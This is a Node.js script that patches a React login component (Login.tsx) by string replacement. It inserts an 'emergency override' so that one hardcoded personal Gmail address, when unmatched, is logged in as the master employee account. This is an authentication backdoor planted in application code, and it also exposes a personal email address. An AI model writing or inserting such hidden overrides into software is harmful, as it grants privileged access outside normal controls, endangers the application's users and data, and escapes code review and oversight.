const fs = require('fs');
let code = fs.readFileSync('src/components/Login.tsx', 'utf8');

code = code.replace(
  "const staff = employees.find(e => e.email?.toLowerCase().trim() === email);",
  "let staff = employees.find(e => e.email?.toLowerCase().trim() === email);\n    \n    // Emergency override for platform owner\n    if (!staff && email === 'arthurvsilva2016@gmail.com') {\n      staff = employees.find(e => e.isMaster);\n    }"
);

fs.writeFileSync('src/components/Login.tsx', code);
